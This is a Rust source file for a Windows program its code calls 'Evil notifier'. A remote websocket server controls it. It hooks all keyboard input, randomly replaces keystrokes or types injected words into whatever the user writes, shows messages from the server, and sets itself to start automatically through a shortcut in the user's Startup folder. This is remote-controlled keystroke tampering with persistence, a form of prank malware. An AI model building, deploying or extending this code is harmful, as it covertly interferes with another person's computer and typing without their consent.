//#![windows_subsystem = "windows"]

use std::{
    env::current_exe,
    fs,
    path::PathBuf,
    sync::{Arc, LazyLock},
    time::Duration,
};

use color_eyre::{Result, eyre::OptionExt};
use futures_util::StreamExt;
use notifier_common::{
    PuppyInsertionMode, PuppyMode, PuppyModeConfig, PuppyReplacementMode, WebSocketAction,
};
use rand::seq::IndexedRandom;
use rdev::{Event, Key, grab, simulate};
use shortcuts_rs::ShellLink;
use std::sync::Mutex;
use tokio::task::spawn_blocking;
use tokio_tungstenite::{
    connect_async,
    tungstenite::{
        Message,
        client::IntoClientRequest,
        http::{HeaderValue, header::USER_AGENT},
    },
};
use winrt_toast_reborn::{Toast, ToastManager, register};

use crate::keys::{KEYS, char_to_keys, get_random_puppy_key};

mod keys;

type NotifierMessage = notifier_common::Message;

const APP_ID: &str = "com.shoudev.cicin.evil.notifier";
const ID: &str = "test";
const BASE_URL: &str = "ws://localhost:3000";

static PUPPY_CONFIG: LazyLock<Arc<Mutex<PuppyModeConfig>>> = LazyLock::new(|| {
    Arc::new(Mutex::new(PuppyModeConfig {
        enabled: false,
        mode: PuppyMode::Insertion(Default::default()),
    }))
});

#[tokio::main]
async fn main() -> Result<()> {
    register(APP_ID, "Evil notifier", None)?;
    setup()?;

    handle_keyboard_events();

    let manager = ToastManager::new(APP_ID);

    loop {
        let result = ws_logic(&manager).await;
        if let Err(err) = result {
            println!("{}", err);
        }
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn ws_logic(manager: &ToastManager) -> Result<()> {
    let mut request = format!("{}/ws", BASE_URL).into_client_request()?;
    request
        .headers_mut()
        .insert(USER_AGENT, HeaderValue::from_static(ID));
    let (ws_stream, _) = connect_async(request).await?;

    let (mut _sender, mut receiver) = ws_stream.split();

    while let Some(Ok(msg)) = receiver.next().await {
        let bytes = match msg {
            Message::Binary(bytes) => bytes,
            _ => continue,
        };

        let message: WebSocketAction = rmp_serde::from_slice(bytes.iter().as_slice()).unwrap();

        match message {
            WebSocketAction::Message(message) => display_message(message, manager)?,
            WebSocketAction::PuppyModeConfig(config) => {
                *PUPPY_CONFIG.lock().unwrap() = config;
            }
            WebSocketAction::NoAction => {}
        }
    }
    Ok(())
}

fn handle_keyboard_events() {
    spawn_blocking(|| {
        _ = grab(handle_keyboard_event);
    });
}

fn handle_keyboard_event(event: Event) -> Option<Event> {
    match event {
        Event {
            time: _,
            name: _,
            event_type: rdev::EventType::KeyPress(key),
        } => {
            let config = (*PUPPY_CONFIG.lock().unwrap()).clone();

            if !config.enabled {
                return Some(event);
            }

            let pass_event = match config.mode {
                PuppyMode::Replacement(config) => handle_puppy_replacement_mode(key, config),
                PuppyMode::Insertion(config) => handle_puppy_insertion_mode(key, config),
            };

            if pass_event { Some(event) } else { None }
        }
        _ => Some(event),
    }
}

static MODE_ON: LazyLock<Arc<Mutex<bool>>> = LazyLock::new(|| Arc::new(Mutex::new(false)));

fn handle_puppy_replacement_mode(key: Key, config: PuppyReplacementMode) -> bool {
    if key == Key::Space {
        let is_on = rand::random_ratio(config.probability, 100);
        *MODE_ON.lock().unwrap() = is_on;
    }

    if !KEYS.contains(&key) {
        return true;
    };

    if !*MODE_ON.lock().unwrap() {
        return true;
    }

    let key = get_random_puppy_key();

    _ = simulate(&rdev::EventType::KeyPress(key));
    _ = simulate(&rdev::EventType::KeyRelease(key));

    false
}

fn handle_puppy_insertion_mode(key: Key, config: PuppyInsertionMode) -> bool {
    if key != Key::Space {
        return true;
    }

    let is_on = rand::random_ratio(config.probability, 100);

    if !is_on {
        return true;
    }

    let empty = "".to_owned();
    let word = config
        .puppy_words
        .choose(&mut rand::rng())
        .unwrap_or(&empty);

    _ = simulate(&rdev::EventType::KeyPress(Key::Space));
    _ = simulate(&rdev::EventType::KeyRelease(Key::Space));

    for char in word.chars() {
        let keys = char_to_keys(char);
        for key in keys {
            _ = simulate(&rdev::EventType::KeyPress(key.to_owned()));
        }
        for key in keys {
            _ = simulate(&rdev::EventType::KeyRelease(key.to_owned()));
        }
    }

    true
}

fn display_message(message: NotifierMessage, manager: &ToastManager) -> Result<()> {
    let mut toast = Toast::new();
    toast
        .text1(format!("{} says", message.from))
        .text2(message.text);

    manager.show(&toast)?;
    Ok(())
}

fn setup() -> Result<()> {
    let home = env_home::env_home_dir().ok_or_eyre("Can't find home path")?;
    let mut startup_path = PathBuf::from(home);
    startup_path.push("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
    let mut link_path = startup_path.clone();
    link_path.push("notifier.lnk");

    if link_path.exists() {
        _ = fs::remove_file(link_path.clone());
    }

    let current_exectutable = current_exe()?;

    let link = ShellLink::new(current_exectutable, None, None, None)?;
    link.create_lnk(link_path)?;

    Ok(())
}
